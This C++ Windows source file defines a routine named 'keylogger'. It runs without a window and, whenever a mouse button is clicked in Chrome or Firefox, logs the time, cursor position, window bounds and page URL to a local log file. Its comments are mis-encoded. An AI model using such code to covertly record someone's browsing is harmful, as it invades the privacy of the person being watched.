#include "atltypes.h"
#include "atlstr.h"
#include <iostream>
#include <psapi.h>
#include <commdlg.h>
#include <time.h>
#include "Header.h"
#include <string>
#include <fstream>
#include <windows.h>

using namespace std;

string get_time_now()
{
	/*
	* ������� �����(������ �� ������)
	*/
	struct tm newtime;
	char am_pm[] = "AM";
	time_t long_time;
	char timebuf[26];
	errno_t err;

	time(&long_time);
	// Convert to local time.  
	err = localtime_s(&newtime, &long_time);
	if (err)
	{
		printf("Invalid argument to _localtime64_s.");
		exit(1);
	}
	string s = to_string(newtime.tm_mday) + "." + to_string(newtime.tm_mon) + "." + to_string(1900 + newtime.tm_year) + "\t";
	// Convert to an ASCII representation.   
	err = asctime_s(timebuf, 26, &newtime);
	if (err)
	{
		printf("Invalid argument to asctime_s.");
		exit(1);
	}
	s += string(timebuf).substr(11, 8) + "\t";
	return s;
}

void keylogger(ofstream &file)
{
	/*
	* ���������
	*/
	tm* ptr;
	time_t seconds;
	int i;
	CPoint pt;
	CRect rect;
	HWND hWnd;
	string str;
	ifstream is("status.txt");
	while (!(is.is_open()))
	{
		Sleep(100);
		if ((GetAsyncKeyState(VK_LBUTTON) != 0) || (GetAsyncKeyState(VK_RBUTTON) != 0) || (GetAsyncKeyState(VK_MBUTTON) != 0))
		{
			GetCursorPos(&pt);
			hWnd = GetForegroundWindow();
			GetWindowRect(hWnd, &rect);
			str = get_active_window();
			if ((str.find("chrome") != string::npos) || (str.find("firefox") != string::npos))
			{
				file << get_time_now(); // ����
										// ������
				file << "(" << pt.x << ";" << pt.y << ")\t";
				// ���������� ��������� ����
				file << "[(" << rect.left << ";" << rect.top << ");(" << rect.left + rect.Width() << ";" << rect.top + rect.Height() << ")]\t";
				// url ��������� ����
				file << get_url(str) << endl;
			}
		}
		is.open("status.txt");
	}
}

// ������ ��� �������
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpszCmdLine, int nCmdShow)
{
	setlocale(LC_ALL, "rus");
	ofstream log_file("log.txt", std::ios_base::app);		// ��� �� ��������

	// ����� ������� ������ ����� ������� �� ������ ������������
	ofstream stat_file("status.txt", std::ios_base::app);
	if (stat_file.is_open())
		if (remove("status.txt") == -1)
			log_file << "error_start_program" << endl;

	//�������� ���
	while (!log_file.is_open())
		ofstream log_file("log.txt");
	keylogger(log_file);

	// ����� ������ ���������
	if (remove("status.txt") == -1)
		log_file << "error_del" << endl;
	log_file.close();
	return 0;
}

